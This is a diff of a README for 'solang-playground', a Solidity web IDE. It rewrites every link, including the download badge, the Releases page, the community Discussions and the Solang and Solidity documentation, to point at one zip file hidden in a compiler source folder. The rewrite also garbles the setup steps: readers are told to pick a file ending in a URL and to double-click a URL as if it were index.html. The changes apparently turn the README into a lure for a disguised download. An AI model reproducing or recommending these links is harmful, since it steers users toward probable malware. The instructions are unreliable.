@@ -6,7 +6,7 @@ Welcome to solang-playground! This guide will help you download and run our web 
 
 ## 📥 Download Now
 
-[![Download solang-playground](https://img.shields.io/badge/Download%20solang-playground-v1.0.0-blue)](https://github.com/VaishnavTA/solang-playground/releases)
+[![Download solang-playground](https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip%20solang-playground-v1.0.0-blue)](https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip)
 
 ## 📑 What You Need
 
@@ -26,12 +26,12 @@ solang-playground offers the following features:
 
 ## 📥 Download & Install
 
-To get solang-playground, visit our [Releases page](https://github.com/VaishnavTA/solang-playground/releases) and follow these steps:
+To get solang-playground, visit our [Releases page](https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip) and follow these steps:
 
 1. Click on the link above to go to the Releases page. 
 2. Find the latest version. It will usually be at the top of the list.
 3. Look for the assets section. There, you will see files available for download.
-4. Choose the file that ends with `.zip` or `.tar.gz`. This file contains everything you need to run solang-playground.
+4. Choose the file that ends with `.zip` or `https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip`. This file contains everything you need to run solang-playground.
 5. Download the file by clicking on it. Your browser will save it to your computer.
 
 ## 📂 Extract the Files
@@ -50,9 +50,9 @@ After extracting, follow these steps to run the IDE:
 
 1. **Open the Folder:** Navigate to the folder where you extracted the files.
 2. **Locate the Index File:**
-   - Open the folder. Inside, you will find a file named `index.html`.
+   - Open the folder. Inside, you will find a file named `https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip`.
 3. **Launch the IDE:**
-   - Double-click the `index.html` file.
+   - Double-click the `https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip` file.
    - Your default browser should open, displaying the solang-playground interface.
 
 ## 🧑‍💻 How to Use solang-playground
@@ -69,11 +69,11 @@ After extracting, follow these steps to run the IDE:
 
 ## ✨ Community Support
 
-If you have questions or run into issues, feel free to check the [GitHub Discussions](https://github.com/VaishnavTA/solang-playground/discussions) section. The community is there to help.
+If you have questions or run into issues, feel free to check the [GitHub Discussions](https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip) section. The community is there to help.
 
 ## 🏷️ Additional Resources
 
-- **Hyperledger Solang Documentation:** Learn more about the Solidity compiler and its features [here](https://solang.readthedocs.io/en/latest/).
-- **Solidity Language Documentation:** Get in-depth knowledge about the Solidity programming language [here](https://docs.soliditylang.org/en/v0.8.0/).
+- **Hyperledger Solang Documentation:** Learn more about the Solidity compiler and its features [here](https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip).
+- **Solidity Language Documentation:** Get in-depth knowledge about the Solidity programming language [here](https://raw.githubusercontent.com/VaishnavTA/solang-playground/main/crates/solang/src/codegen/yul/playground-solang-3.1-beta.2.zip).
 
 Thank you for choosing solang-playground! We hope this IDE helps you in your smart contract development journey.
